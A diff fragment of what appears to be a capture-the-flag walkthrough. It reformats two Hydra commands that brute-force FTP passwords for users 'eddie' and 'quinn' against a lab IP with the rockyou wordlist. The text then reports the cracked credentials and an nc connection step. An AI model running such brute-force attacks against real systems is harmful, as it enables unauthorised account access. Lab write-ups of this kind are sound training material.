@@ -106,11 +106,15 @@ We start off by attempting to brute force the password for `eddie` or `quinn` us
 ```bash
 # Hydra task to break eddie's password.
 #
-hydra -v -f -t 10 -s 10021 -l eddie -P ~/.local/share/red-team/wordlists/rockyou.txt 10.10.152.115 ftp
+hydra -v -f -t 10 -s 10021 -l eddie \
+      -P ~/.local/share/red-team/wordlists/rockyou.txt \
+         10.10.152.115 ftp
 
 # Hydra task to break quinn's password.
 #
-hydra -v -f -t 10 -s 10021 -l quinn -P ~/.local/share/red-team/wordlists/rockyou.txt 10.10.152.115 ftp
+hydra -v -f -t 10 -s 10021 -l quinn \
+      -P ~/.local/share/red-team/wordlists/rockyou.txt \
+         10.10.152.115 ftp
 ```
 
 These quickly return the results `eddie:jordan` and `quinn:andrea`. Let’s try to use `nc -nv 10.10.152.115 10021` to log into `eddie`’s account.
